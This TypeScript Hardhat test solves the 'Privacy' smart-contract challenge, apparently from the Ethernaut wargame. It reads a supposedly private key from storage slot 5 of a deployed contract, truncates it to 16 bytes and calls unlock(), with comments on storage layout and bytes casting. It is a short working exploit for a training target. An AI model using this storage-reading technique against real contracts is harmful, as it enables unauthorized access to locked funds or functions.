import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Privacy", function () {
    let signer: Signer;
    let myAddress: string;
    let challenge_instance_address = "0xd8f183d42c552dCa2FEEc1Ed8771A0BA8d8d61d2";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        myAddress = await signer.getAddress();
        console.log("Primary Signer Address:", myAddress);
        challengeFactory = await ethers.getContractFactory("Privacy");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        // The number 5 comes from the fact that the data array is the 4th element to be stored inside of the 
        // contract's storage. We are looking to get the third index for the _key and therefore we want to get the the value at storage[(3 + 2)]
        // 3 because it's the fourth element in the storage
        // + 2 because we want to get the third element.
        const data_2 = await signer.provider?.getStorageAt(challenge.address, 5);

        // When casting lower sized bytes variables to higher sized bytes variables, we pad the right of the resulting variables to match the required size in bytes.
        // When casting higher size bytes to lower sized bytes, we take the higher order value
        // See: https://www.tutorialspoint.com/solidity/solidity_conversions.htm
        // i.e.: 
        // higher to lower: 
        //  bytes2 a = 0x1234
        //  bytes1 b = bytes1(a) => b = 0x12 (we took the higher order)
        // Lower to higher:
        // bytes1 a = 0x12
        // bytes2 b = bytes2(bytes1) => b = 0x1200 (we padded 0s to the right to match the required bytes count.)
        const bytes16_data_2 = data_2?.substring(2, 34);
        const entryTx = await challenge.unlock(`0x${bytes16_data_2}`, {
            gasLimit: 75000
        });
        await entryTx.wait();
        const locked = await challenge.locked();

        expect(locked).to.be.false;
    });
});
